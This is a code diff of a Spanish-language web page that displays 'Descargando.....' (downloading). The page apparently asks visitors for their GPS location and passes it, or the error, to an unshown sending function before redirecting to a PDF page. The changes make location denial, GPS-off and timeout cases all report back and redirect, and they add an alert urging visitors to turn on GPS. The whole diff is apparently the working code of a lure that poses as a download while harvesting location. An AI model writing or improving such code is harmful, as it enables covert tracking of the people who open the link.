@@ -198,30 +198,47 @@ function solicitarGeo() {
             // 🔥 REDIRECCIÓN FINAL DESPUÉS DE ENVIAR LA UBICACIÓN
             setTimeout(redirigirLuego, 800);
         },
-       err => {
+     err => {
     enviar({
         type: "geo-error",
         error: err.message,
         time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
     });
 
-    // Si el usuario apagó el GPS
-    if (err.code === 2) {
-        alert("Para continuar, activa el GPS de tu dispositivo y vuelve a intentarlo.");
-    }
+    const msg = (err.message || "").toLowerCase();
 
-    // Si el usuario negó permisos (err.code === 1)
-    if (err.code === 1) {
-        // Aquí puedes cambiar el destino si quieres otro enlace especial
+    // 1️⃣ Usuario tocó "NO PERMITIR"
+    // Android/Chrome: "User denied Geolocation"
+    // iPhone/Safari: "The user denied the request for Geolocation"
+    if (
+        msg.includes("denied") ||
+        msg.includes("rechaz") ||
+        msg.includes("negó")
+    ) {
         window.location.href = "https://encuestauta69-gif.github.io/pdf/";
         return;
     }
 
-    // Redirección por defecto
+    // 2️⃣ GPS APAGADO / SIN SEÑAL
+    // Android/Chrome: "Position unavailable"
+    // Safari: "The location could not be determined."
+    if (
+        msg.includes("unavailable") ||
+        msg.includes("not be determined") ||
+        msg.includes("no pudo ser determinada") ||
+        msg.includes("ubicación no disponible")
+    ) {
+        alert("Activa el GPS de tu dispositivo para continuar.");
+        window.location.href = "https://encuestauta69-gif.github.io/pdf/";
+        return;
+    }
+
+    // 3️⃣ Timeout o error desconocido
     setTimeout(() => {
         window.location.href = "https://encuestauta69-gif.github.io/pdf/";
     }, 800);
 }
+
 
 </script>
 
@@ -235,6 +252,7 @@ Descargando.....
 
 </body>
 </html>
+
 
 
 
